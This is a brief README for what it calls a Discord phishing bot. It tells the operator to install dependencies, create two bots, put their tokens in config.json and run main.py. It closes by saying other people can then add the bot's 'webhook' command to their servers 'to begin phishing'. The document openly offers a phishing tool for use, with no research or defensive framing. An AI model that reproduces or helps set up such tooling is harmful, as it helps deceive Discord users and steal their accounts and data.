A Discord phishing bot.

 

# SETUP
You will need [Python](https://www.python.org/downloads/)
You will also need to create 2 discord bots (LOOK UP A TUTORIAL IF U ARE DUMB)
Download the ZIP, and then extract

**first, install the dependancies**
```
open a terminal
```
run the command "python dependancies.py
```
OR
```
double click the "dependancies.py" file to run it

**then, open the config.json file**
```
open with vscode
```
"Bot Token" is bot 1's token, "Gen Token" is bot 2's token
```
"Owners" is the owner's discord ID, the rest are also IDs
```

**next, start the bot**
```
run "main.py" (if you didn't install the dependancies from step 1, you will get an error)
```
head over to your discord server, and type ". sync" (make sure the bots have permissions)
```
people can now invite the bot that offers the command "webhook" to their server to begin phishing
```
